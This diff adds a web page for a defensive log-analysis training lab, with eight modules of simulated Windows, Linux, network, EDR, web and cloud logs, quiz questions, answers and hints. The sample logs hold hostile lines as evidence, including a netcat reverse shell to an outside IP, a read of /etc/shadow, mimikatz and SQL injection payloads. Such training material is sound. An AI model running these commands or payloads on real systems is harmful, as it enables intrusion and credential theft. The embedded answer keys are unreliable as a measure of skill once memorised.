@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Defend Mode · Ultimate Log Analysis & SIEM Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+:root{
+  --bg:#0a0e14; --bg-raised:#0f1419; --bg-card:#131920; --bg-terminal:#080c10;
+  --fg:#c5cdd8; --fg-bright:#e8edf3; --fg-dim:#5a6678;
+  --accent:#00d4ff; --accent-dim:rgba(0,212,255,.12); --accent-mid:rgba(0,212,255,.3);
+  --red:#ff3b5c; --red-dim:rgba(255,59,92,.12);
+  --orange:#ff9f43; --orange-dim:rgba(255,159,67,.12);
+  --cyan:#00d4ff; --cyan-dim:rgba(0,212,255,.12);
+  --yellow:#ffd93d; --yellow-dim:rgba(255,217,61,.12);
+  --purple:#a855f7; --purple-dim:rgba(168,85,247,.12);
+  --border:#1e2733; --border-light:#2a3544;
+  --radius:10px; --mono:'JetBrains Mono',monospace; --sans:'Inter',system-ui,sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:var(--sans);background:var(--bg);color:var(--fg);min-height:100vh;overflow-x:hidden}
+.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;background-image:linear-gradient(rgba(0,212,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.025) 1px,transparent 1px);background-size:60px 60px}
+.bg-glow{position:fixed;z-index:0;pointer-events:none;width:600px;height:600px;border-radius:50%;filter:blur(150px);opacity:.08}
+.bg-glow-1{top:-200px;right:-100px;background:var(--accent)}
+.bg-glow-2{bottom:-200px;left:-100px;background:var(--purple)}
+.app{position:relative;z-index:1}
+.topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 28px;background:rgba(10,14,20,.85);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100}
+.topbar-left{display:flex;align-items:center;gap:12px}
+.logo{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--purple));display:flex;align-items:center;justify-content:center;font-size:1rem;color:#000;font-weight:800}
+.title{font-size:1rem;font-weight:700;color:var(--fg-bright)}
+.subtitle{font-size:.65rem;color:var(--fg-dim);font-weight:500;letter-spacing:1px;text-transform:uppercase}
+.topbar-right{display:flex;align-items:center;gap:10px}
+.stat-pill{display:flex;align-items:center;gap:6px;padding:6px 12px;border-radius:20px;font-size:.72rem;font-weight:600;border:1px solid var(--border-light);background:var(--bg-card)}
+.stat-pill i{color:var(--accent)}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:calc(100vh - 65px)}
+.sidebar{background:var(--bg-raised);border-right:1px solid var(--border);padding:20px 0;overflow-y:auto;max-height:calc(100vh - 65px);position:sticky;top:65px}
+.sidebar::-webkit-scrollbar{width:3px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+.sidebar-section{margin-bottom:18px}
+.sidebar-label{font-size:.62rem;font-weight:700;color:var(--fg-dim);text-transform:uppercase;letter-spacing:1.5px;padding:0 20px;margin-bottom:10px}
+.lab-item{display:flex;align-items:center;gap:12px;padding:10px 20px;cursor:pointer;transition:.15s;border-left:3px solid transparent;position:relative}
+.lab-item:hover{background:rgba(255,255,255,.025)}
+.lab-item.active{background:var(--accent-dim);border-left-color:var(--accent)}
+.lab-item.done .lab-icon{background:var(--accent-dim);color:var(--accent);border-color:var(--accent-mid)}
+.lab-icon{width:30px;height:30px;border-radius:7px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.8rem;background:var(--bg-card);color:var(--fg-dim);border:1px solid var(--border-light);transition:.3s}
+.lab-item.active .lab-icon{background:var(--accent);color:#000;border-color:var(--accent)}
+.lab-info{flex:1;min-width:0}
+.lab-name{font-size:.8rem;font-weight:600;color:var(--fg-bright);line-height:1.2}
+.lab-item.active .lab-name{color:var(--accent)}
+.lab-cat{font-size:.65rem;color:var(--fg-dim);margin-top:2px}
+.content{padding:24px 28px;max-width:1400px}
+.lab-header{margin-bottom:24px}
+.lab-tag{display:inline-flex;align-items:center;gap:8px;font-size:.7rem;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;font-family:var(--mono)}
+.lab-tag::before{content:'';width:24px;height:2px;background:var(--accent);border-radius:1px}
+.lab-header h1{font-size:1.8rem;font-weight:800;color:var(--fg-bright);line-height:1.2;margin-bottom:10px}
+.lab-header p{font-size:.9rem;color:var(--fg-dim);line-height:1.7;max-width:800px}
+
+/* Info / How-To Box */
+.info-box{background:var(--bg-card);border:1px solid var(--border);border-left:4px solid var(--cyan);border-radius:8px;padding:15px;margin-bottom:20px;}
+.info-box h4{color:var(--cyan);font-size:.85rem;margin-bottom:10px;display:flex;align-items:center;gap:8px;}
+.info-box ol{margin-left:20px;font-size:.8rem;color:var(--fg);line-height:1.7;}
+.info-box ol li{margin-bottom:5px;}
+.info-box code{background:var(--bg-terminal);padding:2px 6px;border-radius:3px;color:var(--accent);font-family:var(--mono);font-size:.75rem;}
+
+.log-viewer-bar{display:flex;align-items:center;gap:10px;padding:10px 16px;background:#0d1117;border:1px solid var(--border);border-bottom:none;border-radius:var(--radius) var(--radius) 0 0}
+.log-search-bar{flex:1;display:flex;align-items:center;gap:8px;background:var(--bg-card);border:1px solid var(--border-light);padding:6px 12px;border-radius:6px}
+.log-search-bar i{color:var(--accent)}
+.log-search-input{flex:1;background:transparent;border:none;outline:none;color:var(--fg-bright);font-family:var(--mono);font-size:.8rem}
+.log-search-btn{padding:4px 12px;border-radius:4px;border:1px solid var(--accent-mid);background:var(--accent-dim);color:var(--accent);cursor:pointer;font-family:var(--mono);font-size:.72rem;font-weight:700}
+.log-search-btn:hover{background:var(--accent);color:#000}
+
+.log-body{background:var(--bg-terminal);border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius);padding:16px;height:300px;overflow-y:auto;font-family:var(--mono);font-size:.75rem;line-height:1.6}
+.log-body::-webkit-scrollbar{width:6px}
+.log-body::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:10px}
+.log-line{margin-bottom:4px;padding:2px 4px;border-radius:3px;transition:0.1s}
+.log-line:hover{background:rgba(255,255,255,0.05)}
+.log-line.highlight{background:rgba(255,217,61,0.15);border-left:3px solid var(--yellow)}
+.log-time{color:var(--purple)}
+.log-source{color:var(--cyan)}
+.log-event{color:var(--fg-bright);font-weight:600}
+.log-msg{color:var(--fg-dim)}
+
+.task-panel{background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-top:20px}
+.task-title{font-size:1rem;font-weight:700;color:var(--fg-bright);margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.task-question{font-size:.85rem;color:var(--fg);margin-bottom:15px;line-height:1.6}
+.task-input-group{display:flex;gap:10px}
+.task-input{flex:1;background:var(--bg);border:1px solid var(--border-light);color:var(--fg-bright);padding:10px 14px;border-radius:8px;font-family:var(--mono);font-size:.85rem;outline:none;transition:0.2s}
+.task-input:focus{border-color:var(--accent)}
+.task-btn{padding:10px 18px;border-radius:8px;border:none;background:var(--accent);color:#000;font-weight:700;cursor:pointer;transition:0.2s}
+.task-btn:hover{opacity:0.9}
+.task-feedback{margin-top:10px;font-size:.8rem;font-family:var(--mono)}
+.task-feedback.success{color:var(--accent)}
+.task-feedback.error{color:var(--red)}
+
+.hint-box{background:var(--bg);border:1px solid var(--border);border-left:4px solid var(--yellow);border-radius:8px;padding:12px;margin-top:15px;font-size:.8rem;color:var(--fg-dim);display:none;}
+.hint-box.show{display:block}
+.hint-box code{background:var(--bg-raised);padding:2px 6px;border-radius:3px;color:var(--accent);font-family:var(--mono)}
+
+.complete-banner{display:none;align-items:center;gap:12px;padding:16px 20px;border-radius:var(--radius);background:var(--accent-dim);border:1px solid var(--accent-mid);margin-top:20px}
+.complete-banner.show{display:flex}
+.complete-banner i{color:var(--accent);font-size:1.2rem}
+.complete-banner span{color:var(--accent);font-weight:600;font-size:.88rem}
+
+.btn{padding:11px 22px;border-radius:var(--radius);font-size:.85rem;font-weight:700;cursor:pointer;border:1px solid var(--border-light);background:var(--bg-card);color:var(--fg);font-family:var(--sans);transition:.2s;display:inline-flex;align-items:center;gap:8px;text-decoration:none}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:linear-gradient(135deg,var(--accent),#00aacc);color:#000;border:none}
+.btn.primary:hover{transform:translateY(-2px)}
+
+@media(max-width:1024px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{position:relative;top:0;max-height:none;display:flex;overflow-x:auto;padding:12px;gap:4px;border-right:none;border-bottom:1px solid var(--border)}
+  .sidebar-section{margin-bottom:0;flex:1}
+  .sidebar-label{display:none}
+  .lab-item{padding:8px 12px;white-space:nowrap;border-left:none;border-bottom:2px solid transparent;flex-shrink:0}
+  .lab-item.active{border-bottom-color:var(--accent);border-left:none}
+  .lab-cat{display:none}
+}
+</style>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="bg-glow bg-glow-1"></div>
+<div class="bg-glow bg-glow-2"></div>
+<div class="app">
+  <header class="topbar">
+    <div class="topbar-left">
+      <div class="logo"><i class="fas fa-magnifying-glass-chart"></i></div>
+      <div>
+        <div class="title">Defend Mode: Ultimate Log Analysis</div>
+        <div class="subtitle">8 Modules · Extraction to SIEM</div>
+      </div>
+    </div>
+    <div class="topbar-right">
+      <div class="stat-pill"><i class="fas fa-check-circle"></i> <span id="completedCount">0</span> / <span id="totalCount">8</span> Modules</div>
+    </div>
+  </header>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar"></aside>
+    <main class="content" id="content"></main>
+  </div>
+</div>
+
+<script>
+const LABS = [
+  {
+    id:'win_logs', name:'Windows Event Logs', category:'Brute-Force Attack', icon:'fa-windows', color:'cyan',
+    description:'Analyze Windows Security logs to identify a successful brute-force attack and malicious process execution.',
+    scenario:'A Windows Server was compromised. You are given a snippet of the Security event log. Find the source IP of the attacker and the malicious process they executed.',
+    howToGet:[
+      "Press <code>Win + R</code>, type <code>eventvwr.msc</code> and press Enter to open Event Viewer.",
+      "Expand <code>Windows Logs</code> on the left pane, then click on <code>Security</code>.",
+      "On the right pane, click <code>Filter Current Log...</code>",
+      "In the Event ID box, type <code>4625</code> (Failed Logon) or <code>4688</code> (Process Creation) and click OK."
+    ],
+    logs:[
+      {time:"12:00:01", source:"Security", event:"4624", msg:"An account was successfully logged on. Account: SYSTEM. Logon Type: 5. Source Network Address: -"},
+      {time:"12:05:12", source:"Security", event:"4625", msg:"An account failed to log on. Account: Administrator. Logon Type: 3. Source Network Address: 192.168.1.50"},
+      {time:"12:05:14", source:"Security", event:"4625", msg:"An account failed to log on. Account: Administrator. Logon Type: 3. Source Network Address: 192.168.1.50"},
+      {time:"12:05:16", source:"Security", event:"4625", msg:"An account failed to log on. Account: Administrator. Logon Type: 3. Source Network Address: 192.168.1.50"},
+      {time:"12:05:18", source:"Security", event:"4625", msg:"An account failed to log on. Account: Administrator. Logon Type: 3. Source Network Address: 192.168.1.50"},
+      {time:"12:05:20", source:"Security", event:"4624", msg:"An account was successfully logged on. Account: Administrator. Logon Type: 3. Source Network Address: 192.168.1.50"},
+      {time:"12:06:01", source:"Security", event:"4688", msg:"A process has been created. Creator Subject: Administrator. Process Name: C:\\Windows\\System32\\cmd.exe"},
+      {time:"12:06:05", source:"Security", event:"4688", msg:"A process has been created. Creator Subject: Administrator. Process Name: C:\\Temp\\mimikatz.exe"}
+    ],
+    tasks:[
+      {q:"What is the IP address of the attacker?", a:"192.168.1.50", hint:"Search for Event ID <code>4625</code> (Failed Logon). The IP is in the 'Source Network Address' field."},
+      {q:"What is the name of the malicious executable the attacker ran?", a:"mimikatz.exe", hint:"Search for Event ID <code>4688</code> (Process Creation). Look for an unusual process in a Temp folder."}
+    ]
+  },
+  {
+    id:'linux_logs', name:'Linux Auth Logs', category:'Privilege Escalation', icon:'fa-linux', color:'orange',
+    description:'Use command-line concepts to filter Linux authentication logs and find a privilege escalation attack.',
+    scenario:'A web server was breached via SSH. The attacker logged in as the "www-data" user and escalated privileges to root using a sudo misconfiguration.',
+    howToGet:[
+      "Open a terminal on the Linux machine.",
+      "Authentication logs are stored in <code>/var/log/auth.log</code> (Ubuntu/Debian) or <code>/var/log/secure</code> (CentOS/RHEL).",
+      "Use the <code>cat</code> or <code>less</code> command to view it: <code>cat /var/log/auth.log</code>",
+      "To find attacks quickly, use grep: <code>grep 'sshd' /var/log/auth.log</code> or <code>grep 'sudo' /var/log/auth.log</code>"
+    ],
+    logs:[
+      {time:"08:00:00", source:"sshd", event:"Accepted", msg:"Accepted password for admin from 10.0.0.5 port 22 ssh2"},
+      {time:"08:15:23", source:"sshd", event:"Accepted", msg:"Accepted password for www-data from 45.33.21.9 port 49152 ssh2"},
+      {time:"08:15:45", source:"sudo", event:"command", msg:"www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/sudo su"},
+      {time:"08:16:00", source:"sudo", event:"command", msg:"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow"},
+      {time:"08:20:00", source:"cron", event:"job", msg:"(root) CMD (/usr/bin/nc -e /bin/bash 45.33.21.9 4444)"}
+    ],
+    tasks:[
+      {q:"What is the IP address of the attacker who logged in as www-data?", a:"45.33.21.9", hint:"Search the logs for <code>sshd</code> and <code>www-data</code>."},
+      {q:"What command did the www-data user run to escalate to root?", a:"sudo su", hint:"Search for <code>sudo</code> events where the USER is 'root' and the user running it is 'www-data'."}
+    ]
+  },
+  {
+    id:'switch_logs', name:'Cisco Switch Logs', category:'Rogue Device', icon:'fa-network-wired', color:'purple',
+    description:'Analyze Cisco IOS logging output to identify a port security violation and MAC address spoofing.',
+    scenario:'Users on the 1st floor are reporting network drops. You check the switch logs to find a rogue device plugging in and triggering security violations.',
+    howToGet:[
+      "Connect to the Cisco Switch via SSH or Console cable.",
+      "Enter Privileged EXEC mode by typing <code>enable</code>.",
+      "Type <code>terminal monitor</code> to view logs in real-time on your SSH session.",
+      "To view the historical log buffer, simply type <code>show logging</code>."
+    ],
+    logs:[
+      {time:"14:00:00", source:"LINK-3-UPDOWN", event:"Interface", msg:"Interface GigabitEthernet0/1, changed state to up"},
+      {time:"14:00:01", source:"SEC-6-IPACCESSLOGP", event:"ACL", msg:"list 101 denied tcp 192.168.10.5(443) -> 10.0.0.1(80)"},
+      {time:"14:05:00", source:"PORT_SECURITY-2-PSECURE_VIOLATION", event:"Security", msg:"Security violation occurred, caused by MAC address 00:11:22:33:44:55 on port GigabitEthernet0/1."},
+      {time:"14:05:01", source:"PORT_SECURITY-2-PSECURE_VIOLATION", event:"Security", msg:"Security violation occurred, caused by MAC address 00:11:22:33:44:55 on port GigabitEthernet0/1."},
+      {time:"14:10:00", source:"LINK-3-UPDOWN", event:"Interface", msg:"Interface GigabitEthernet0/1, changed state to down"}
+    ],
+    tasks:[
+      {q:"What is the MAC address of the rogue device?", a:"00:11:22:33:44:55", hint:"Search for the keyword <code>VIOLATION</code> in the switch logs."},
+      {q:"On which switch port was the rogue device detected?", a:"GigabitEthernet0/1", hint:"Look at the same log line containing the MAC address. The port is listed at the end."}
+    ]
+  },
+  {
+    id:'siem_edr', name:'SIEM / EDR Correlation', category:'Ransomware Detection', icon:'fa-shield-halved', color:'red',
+    description:'Analyze SIEM alerts and EDR telemetry to trace a ransomware execution chain and identify the patient zero.',
+    scenario:'The EDR is throwing alerts about mass file modifications. You must query the SIEM to find the initial entry point (patient zero) and the ransomware payload name.',
+    howToGet:[
+      "<strong>What is SIEM?</strong> (e.g., Splunk, QRadar): It collects logs from ALL devices (Windows, Linux, Firewalls) into one searchable database. You use query languages like SPL to find attacks.",
+      "<strong>What is EDR?</strong> (e.g., CrowdStrike, SentinelOne): It is an agent installed on a PC that records EVERY process execution, network connection, and file modification.",
+      "In your SIEM dashboard, click on the EDR Alert (e.g., 'Mass File Modification').",
+      "Pivot to the 'Process Timeline' or 'Event Viewer' tab on the EDR console to see the parent process that launched the malicious file."
+    ],
+    logs:[
+      {time:"09:00:00", source:"EDR", event:"ProcessStart", msg:"Process 'outlook.exe' spawned 'powershell.exe' (ParentPID: 1024)"},
+      {time:"09:00:05", source:"EDR", event:"NetworkConn", msg:"powershell.exe connected to 185.220.101.5 on port 443"},
+      {time:"09:00:10", source:"EDR", event:"ProcessStart", msg:"Process 'powershell.exe' spawned 'svchost32.exe' in C:\\Users\\jsmith\\AppData\\Local\\Temp\\"},
+      {time:"09:00:15", source:"EDR", event:"FileMod", msg:"svchost32.exe modified 500+ files in C:\\Users\\jsmith\\Documents"},
+      {time:"09:00:20", source:"EDR", event:"FileMod", msg:"svchost32.exe created C:\\Users\\jsmith\\Desktop\\README_RECOVER_FILES.txt"},
+      {time:"09:05:00", source:"Firewall", event:"Block", msg:"Blocked inbound RDP connection from 45.33.21.9 to 10.0.0.5"}
+    ],
+    tasks:[
+      {q:"What is the name of the malicious executable that encrypted the files?", a:"svchost32.exe", hint:"Search for <code>FileMod</code> events or look for a suspicious process in a Temp folder."},
+      {q:"Which user account was compromised to launch the attack (Patient Zero)?", a:"jsmith", hint:"Look at the file paths in the EDR alerts to determine which user profile was compromised."}
+    ]
+  },
+  {
+    id:'web_logs', name:'Apache Web Logs', category:'SQL Injection', icon:'fa-globe', color:'cyan',
+    description:'Analyze Apache access logs to identify a SQL injection attack against a login page.',
+    scenario:'A web application firewall flagged suspicious activity. You need to parse the raw Apache access logs to find the SQLi payload and the vulnerable parameter.',
+    howToGet:[
+      "SSH into the Web Server.",
+      "Navigate to the Apache log directory: <code>cd /var/log/apache2/</code> (Ubuntu) or <code>cd /var/log/httpd/</code> (CentOS).",
+      "Open the access log: <code>cat access.log</code>",
+      "To find SQL injection patterns, use grep: <code>grep -i 'union\\|select\\|drop' access.log</code>"
+    ],
+    logs:[
+      {time:"10:00:01", source:"Apache", event:"GET", msg:"/index.html 200 192.168.1.15"},
+      {time:"10:00:05", source:"Apache", event:"GET", msg:"/login.php?user=admin&pass=123 200 192.168.1.15"},
+      {time:"10:00:10", source:"Apache", event:"GET", msg:"/login.php?user=admin'--&pass=x 200 45.33.21.9"},
+      {time:"10:00:12", source:"Apache", event:"GET", msg:"/login.php?user=admin' OR '1'='1&pass=x 200 45.33.21.9"},
+      {time:"10:00:15", source:"Apache", event:"GET", msg:"/admin/dashboard.php 302 45.33.21.9"},
+      {time:"10:00:20", source:"Apache", event:"GET", msg:"/api/users?id=1;DROP TABLE users 500 45.33.21.9"}
+    ],
+    tasks:[
+      {q:"What is the IP address of the SQL injection attacker?", a:"45.33.21.9", hint:"Look for requests containing SQL syntax like <code>' OR '1'='1</code>."},
+      {q:"What is the name of the vulnerable parameter exploited?", a:"user", hint:"Look at the URL parameters in the malicious requests. Which one contains the SQL payload?"}
+    ]
+  },
+  {
+    id:'fw_logs', name:'Firewall Logs', category:'C2 Beaconing', icon:'fa-fire', color:'orange',
+    description:'Analyze perimeter firewall logs to detect Command & Control (C2) beaconing behavior.',
+    scenario:'An internal host is suspected of being infected with malware. You pull the firewall logs to find the C2 server IP and the infected internal host.',
+    howToGet:[
+      "Log into the Firewall Web Interface (e.g., Palo Alto, Fortinet, pfSense).",
+      "Navigate to the <code>Monitor</code> or <code>Logs</code> tab, then select <code>Traffic</code>.",
+      "Filter the log view by Source IP (if you know the infected host) or Destination Port (e.g., 4444 or 443).",
+      "Look for connections happening at regular, repeating intervals (e.g., exactly every 60 seconds)."
+    ],
+    logs:[
+      {time:"00:00:00", source:"FW", event:"ALLOW", msg:"10.0.0.5 -> 8.8.8.8:53 (UDP)"},
+      {time:"00:00:15", source:"FW", event:"DENY", msg:"10.0.0.15 -> 185.220.101.5:4444 (TCP)"},
+      {time:"00:01:15", source:"FW", event:"ALLOW", msg:"10.0.0.15 -> 185.220.101.5:443 (TCP)"},
+      {time:"00:02:15", source:"FW", event:"ALLOW", msg:"10.0.0.15 -> 185.220.101.5:443 (TCP)"},
+      {time:"00:03:15", source:"FW", event:"ALLOW", msg:"10.0.0.15 -> 185.220.101.5:443 (TCP)"},
+      {time:"00:04:15", source:"FW", event:"ALLOW", msg:"10.0.0.15 -> 185.220.101.5:443 (TCP)"}
+    ],
+    tasks:[
+      {q:"What is the IP address of the internal infected host?", a:"10.0.0.15", hint:"Look for an internal IP making repeated, consistent connections to the same external IP."},
+      {q:"What is the IP address of the Command & Control (C2) server?", a:"185.220.101.5", hint:"This is the external IP that the infected host is communicating with every minute (beaconing)."}
+    ]
+  },
+  {
+    id:'ad_logs', name:'Active Directory Logs', category:'Kerberoasting', icon:'fa-users', color:'purple',
+    description:'Analyze Domain Controller Security logs to identify a Kerberoasting attack.',
+    scenario:'An attacker has compromised a standard user account and is requesting Service Tickets (TGS) for high-privilege service accounts to crack their passwords offline.',
+    howToGet:[
+      "Log into the Domain Controller (DC) as an Administrator.",
+      "Open <code>Event Viewer</code> (<code>eventvwr.msc</code>).",
+      "Navigate to <code>Windows Logs</code> -> <code>Security</code>.",
+      "Filter for Event ID <code>4769</code> (Kerberos Service Ticket Request)."
+    ],
+    logs:[
+      {time:"13:00:00", source:"Security", event:"4768", msg:"A Kerberos authentication ticket (TGT) was requested. Account: jsmith"},
+      {time:"13:05:00", source:"Security", event:"4769", msg:"A Kerberos service ticket (TGS) was requested. Account: jsmith. Service: krbtgt/EXAMPLE.COM"},
+      {time:"13:05:01", source:"Security", event:"4769", msg:"A Kerberos service ticket (TGS) was requested. Account: jsmith. Service: cifs/fileserver.example.com"},
+      {time:"13:05:02", source:"Security", event:"4769", msg:"A Kerberos service ticket (TGS) was requested. Account: jsmith. Service: mssqlsvc/dbserver.example.com"},
+      {time:"13:05:03", source:"Security", event:"4769", msg:"A Kerberos service ticket (TGS) was requested. Account: jsmith. Service: cifs/fileserver.example.com"}
+    ],
+    tasks:[
+      {q:"What Event ID is associated with the Kerberos TGS ticket requests?", a:"4769", hint:"Look for the event ID that indicates a Service Ticket was requested, not a TGT (which is 4768)."},
+      {q:"What is the username of the compromised account requesting the tickets?", a:"jsmith", hint:"This is the user account listed in the TGS requests."}
+    ]
+  },
+  {
+    id:'aws_logs', name:'AWS CloudTrail Logs', category:'Cloud Breach', icon:'fa-cloud', color:'red',
+    description:'Analyze AWS CloudTrail logs to identify an S3 bucket compromise and data exfiltration.',
+    scenario:'An alert was triggered for massive data transfer from an S3 bucket. You must query the CloudTrail logs to find the API call used and the attacker\'s IP.',
+    howToGet:[
+      "Log into the AWS Management Console.",
+      "Search for and open <code>CloudTrail</code>.",
+      "On the left pane, click <code>Event history</code>.",
+      "Filter by Event source (e.g., <code>s3.amazonaws.com</code>) or look for read/write events."
+    ],
+    logs:[
+      {time:"09:00:00", source:"CloudTrail", event:"AssumeRole", msg:"User: AdminRole. Action: sts:AssumeRole. SourceIP: 10.0.0.5"},
+      {time:"09:05:00", source:"CloudTrail", event:"ListBuckets", msg:"User: CompromisedRole. Action: s3:ListBuckets. SourceIP: 45.33.21.9"},
+      {time:"09:10:00", source:"CloudTrail", event:"PutBucketAcl", msg:"User: CompromisedRole. Action: s3:PutBucketAcl. Bucket: company-data. SourceIP: 45.33.21.9"},
+      {time:"09:15:00", source:"CloudTrail", event:"GetObject", msg:"User: CompromisedRole. Action: s3:GetObject. Bucket: company-data. SourceIP: 45.33.21.9"}
+    ],
+    tasks:[
+      {q:"What AWS API call was used to make the bucket public?", a:"PutBucketAcl", hint:"Search the CloudTrail logs for an action that modifies Access Control Lists (ACL) for a bucket."},
+      {q:"What is the external IP address of the attacker?", a:"45.33.21.9", hint:"Look at the SourceIP field in the malicious API calls."}
+    ]
+  }
+];
+
+let currentLab = 0;
+let currentTask = 0;
+let completedLabs = new Set();
+
+function renderSidebar(){
+  const sb = document.getElementById('sidebar');
+  let html = `
+    <a href="paid-cybersecurity-course.html" style="display:flex; align-items:center; gap:8px; text-decoration:none; color:var(--cyan); padding:10px 20px; margin-bottom:15px; font-size:0.85rem; font-weight:700; border-bottom:1px solid var(--border);">
+      <i class="fas fa-arrow-left"></i> Back to Attack Labs
+    </a>
+    <div class="sidebar-section"><div class="sidebar-label">Log Analysis Modules</div>
+  `;
+  LABS.forEach((lab,i)=>{
+    const done = completedLabs.has(i);
+    const active = i===currentLab;
+    html += `<div class="lab-item ${active?'active':''} ${done?'done':''}" onclick="selectLab(${i})">
+      <div class="lab-icon"><i class="fas ${lab.icon}"></i></div>
+      <div class="lab-info">
+        <div class="lab-name">${lab.name}</div>
+        <div class="lab-cat">${lab.category}</div>
+      </div>
+    </div>`;
+  });
+  html += '</div>';
+  sb.innerHTML = html;
+  document.getElementById('completedCount').textContent = completedLabs.size;
+  document.getElementById('totalCount').textContent = LABS.length;
+}
+
+function renderLab(){
+  const lab = LABS[currentLab];
+  const area = document.getElementById('content');
+  const isComplete = currentTask >= lab.tasks.length;
+
+  let logsHTML = lab.logs.map(l => `
+    <div class="log-line">
+      <span class="log-time">[${l.time}]</span> 
+      <span class="log-source">${l.source}</span> 
+      <span class="log-event">${l.event}:</span> 
+      <span class="log-msg">${l.msg}</span>
+    </div>
+  `).join('');
+
+  let howToHTML = lab.howToGet.map(step => `<li>${step}</li>`).join('');
+
+  let taskHTML = '';
+  if (!isComplete) {
+    taskHTML = `
+      <div class="task-panel">
+        <div class="task-title"><i class="fas fa-bullseye" style="color:var(--accent)"></i> Investigation Task ${currentTask + 1} of ${lab.tasks.length}</div>
+        <div class="task-question">${lab.tasks[currentTask].q}</div>
+        <div class="task-input-group">
+          <input type="text" class="task-input" id="answerInput" placeholder="Type your answer here..." autocomplete="off">
+          <button class="task-btn" onclick="checkAnswer()">Submit</button>
+        </div>
+        <div class="task-feedback" id="taskFeedback"></div>
+        <div class="hint-box" id="hintBox">${lab.tasks[currentTask].hint}</div>
+      </div>
+    `;
+  }
+
+  area.innerHTML = `
+    <div class="lab-header">
+      <div class="lab-tag"><i class="fas ${lab.icon}"></i> Module ${currentLab+1} · ${lab.category}</div>
+      <h1>${lab.name}</h1>
+      <p>${lab.description}</p>
+    </div>
+
+    <div class="info-box">
+      <h4><i class="fas fa-info-circle"></i> How to get these logs (Beginner Guide)</h4>
+      <ol>${howToHTML}</ol>
+    </div>
+
+    <div style="background:linear-gradient(135deg,rgba(0,212,255,.08),rgba(168,85,247,.05)); border:1px solid rgba(0,212,255,.2); border-radius:10px; padding:14px 18px; margin-bottom:18px; display:flex; gap:12px; align-items:flex-start;">
+      <i class="fas fa-triangle-exclamation" style="color:var(--accent); font-size:1rem; padding-top:2px"></i>
+      <div style="font-size:.82rem; color:var(--fg); line-height:1.6">
+        <strong style="color:var(--cyan)">Scenario:</strong> ${lab.scenario}
+      </div>
+    </div>
+
+    <div class="log-viewer-bar">
+      <div class="log-search-bar">
+        <i class="fas fa-filter"></i>
+        <input type="text" class="log-search-input" id="searchInput" placeholder="Filter logs (e.g., 4625, sshd, VIOLATION)..." oninput="filterLogs()">
+      </div>
+      <button class="log-search-btn" onclick="clearFilter()">Clear</button>
+    </div>
+    <div class="log-body" id="logBody">
+      ${logsHTML}
+    </div>
+
+    ${taskHTML}
+
+    <div class="complete-banner ${isComplete?'show':''}" id="completeBanner">
+      <i class="fas fa-circle-check"></i>
+      <span>Module completed! You successfully analyzed the logs.</span>
+    </div>
+
+    <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:24px;">
+      ${!isComplete ? `
+        <button class="btn" onclick="showHint()"><i class="fas fa-lightbulb"></i> Show Hint</button>
+      ` : `
+        <button class="btn primary" onclick="nextLab()"><i class="fas fa-arrow-right"></i> Next Module</button>
+      `}
+    </div>
+  `;
+
+  if (!isComplete) {
+    const input = document.getElementById('answerInput');
+    input.focus();
+    input.addEventListener('keydown', e => {
+      if (e.key === 'Enter') checkAnswer();
+    });
+  }
+}
+
+function filterLogs() {
+  const term = document.getElementById('searchInput').value.toLowerCase().trim();
+  const lines = document.querySelectorAll('.log-line');
+  
+  lines.forEach(line => {
+    const text = line.textContent.toLowerCase();
+    if (term === '') {
+      line.classList.remove('highlight');
+      line.style.display = 'block';
+    } else if (text.includes(term)) {
+      line.classList.add('highlight');
+      line.style.display = 'block';
+    } else {
+      line.style.display = 'none';
+    }
+  });
+}
+
+function clearFilter() {
+  document.getElementById('searchInput').value = '';
+  filterLogs();
+}
+
+function checkAnswer() {
+  const lab = LABS[currentLab];
+  const task = lab.tasks[currentTask];
+  const input = document.getElementById('answerInput');
+  const feedback = document.getElementById('taskFeedback');
+  
+  const userAns = input.value.trim().toLowerCase();
+  const correctAns = task.a.toLowerCase();
+
+  if (userAns === correctAns) {
+    feedback.className = 'task-feedback success';
+    feedback.textContent = '[+] Correct! Excellent analysis.';
+    setTimeout(() => {
+      currentTask++;
+      if (currentTask >= lab.tasks.length) {
+        completedLabs.add(currentLab);
+        renderSidebar();
+        renderLab();
+      } else {
+        renderLab();
+      }
+    }, 1000);
+  } else {
+    feedback.className = 'task-feedback error';
+    feedback.textContent = '[-] Incorrect. Examine the logs again or use the hint.';
+  }
+}
+
+function showHint() {
+  document.getElementById('hintBox').classList.add('show');
+}
+
+function selectLab(idx){
+  if(idx === currentLab) return;
+  currentLab = idx;
+  currentTask = 0;
+  renderSidebar();
+  renderLab();
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function nextLab(){
+  if(currentLab < LABS.length - 1){
+    currentLab++;
+    currentTask = 0;
+    renderSidebar();
+    renderLab();
